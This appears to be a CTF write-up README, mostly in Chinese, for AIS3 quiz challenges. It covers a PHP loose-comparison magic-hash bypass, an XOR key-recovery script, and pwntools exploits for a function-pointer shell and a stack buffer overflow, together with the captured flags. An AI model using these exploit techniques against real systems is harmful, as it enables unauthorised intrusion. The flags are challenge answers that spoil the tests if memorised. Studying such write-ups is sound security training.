# ctf-wirte-ups
record my write-ups
# misc1
> 送分題(忘了存flag)

# misc2
> 題目關了忘記解法

# web1
> 連線時得到http response 302
> 使用burp suite便找到flag

# web2
> 利用php == 判斷bug
> 當2個數字2是0e開頭的字串時，使用==會判斷為true
> 網路上找了一組 240610708, QNKCDZO
> 測試就得到flag

# crypto1.py
> 只要了解如何用xor做加密,便能解開這題
> 首先利用xor的特性，去找出加密的key
> 再利用找出的key，去對加密後的結果進行解密
```python
#!/usr/bin/env python
import binascii
import struct
  
encrypted = [964600246, 1376627084, 1208859320, 1482862807, 1326295511, 1181531558, 2003814564]

'''
    Since A xor B = C, we can get the result: A xor C = B.
    First, caculator A xor C get B(mask),
    and then decryptor each pattern.
'''
ais3 = 'AIS3'[::-1]
ais3 = int('0x'+binascii.hexlify(ais3), base=16)

xor_mask = encrypted[0] ^ ais3

for pattern in encrypted:
    print struct.pack('<I', pattern ^ xor_mask),
print
```
flag is AIS3{A X OR B  XOR  A E QUAL S B}

# pwn1
> 打開ida，看完程式碼
> 大概了解pwn1.bin會將讀入資料當作function去執行
> 因此只要把送一個位址進去就好，
> 又在function table中找到youcantseeme()，可以直接開啟shell
> 只是function的開始為轉成字串會有 \n 存在
> 於是選了在stack上放 sh 這行做為執行位址
> 便能取得shell(只是剛開始找不到flag，因為在/bin/pwn1/flag)
>> 0x08048613 <+9>:	push   0x804875c
```python
#!/usr/bin/env python
from pwn import *

DEBUG = not False

if DEBUG:
    r = process('pwn1.bin')
else:
    r = remote('quiz.ais3.org', 9561)

r.recvuntil(':')
r.sendline(p32(0x08048613))

if not DEBUG:
    r.sendline("cd /home/pwn1")
    r.sendline("cat flag")
    print r.recvline()

r.interactive()
r.close()

```
flag is ais3{4nn0y1n9_Wh1t3_SpAcE_CHAR4CTERS}

# pwn2
> 題目上使用者的密碼為variable password的記憶體位址
> 但在讀取使用者帳號和密碼時，存在stack buffer overflow漏洞
> 可以再輸入帳號時直接修改密碼(structure 結構帳號和密碼的位置連載一起)
> 輸入修改好的密碼後，在選1便能得到利用密碼做xor加密的密文
> 利用密碼將得的密文解密(可能是選的密碼太差導致拿到不可顯示的字元)
> 取得(2r:\x0b425\x1e \x1e2(,1-r\x1e.7$3'-.6<LKAA\x81\x18\xaa�nAAA))
> xor後得到is3{Just_a_simpl3_overflow}\r\n\x00\x00\xc0Y\xeb\xae\xfe\xfc/\x00\x00\x00hh
> 修改一下答案得到ais3{Just_a_simpl3_overflow}

```python
from pwn import *

r = remote('quiz.ais3.org', 56746)
r.recvuntil(':')
r.sendline('AAAAAAAAAAAAAAAAAAAAAAAA')
r.recvuntil(':')
r.sendline(str(0x41414141))
r.interactive()
r.close()
```
flag is ais3{Just_a_simpl3_overflow}
